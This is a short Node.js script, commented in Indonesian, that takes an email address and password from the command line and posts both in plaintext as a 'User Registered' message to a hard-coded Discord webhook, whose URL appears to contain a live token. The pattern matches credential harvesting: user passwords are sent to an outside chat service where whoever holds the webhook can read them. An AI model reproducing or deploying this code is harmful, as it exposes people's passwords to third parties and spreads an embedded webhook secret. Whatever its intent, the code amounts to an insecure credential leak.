const axios = require("axios");
const email = process.argv[2]; // Ambil argumen pertama
const password = process.argv[3]; // Ambil argumen kedua

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1354232270961246338/AwMLAvvDfGOqbduSiVMWPwdYvdraise0oiVJylgdV8hZwhpKgR3CSV5ujkBHFac3KPuv";

axios.post(DISCORD_WEBHOOK_URL, { content: `🆕 **User Registered**\n📧 **Email:** ${email}\n🔒 **Password :** ${password}` }, {
    headers: { "Content-Type": "application/json" }
})
.then(response => console.log("Sukses:", response.data))
.catch(error => console.error("Gagal:", error.response ? error.response.data : error.message));
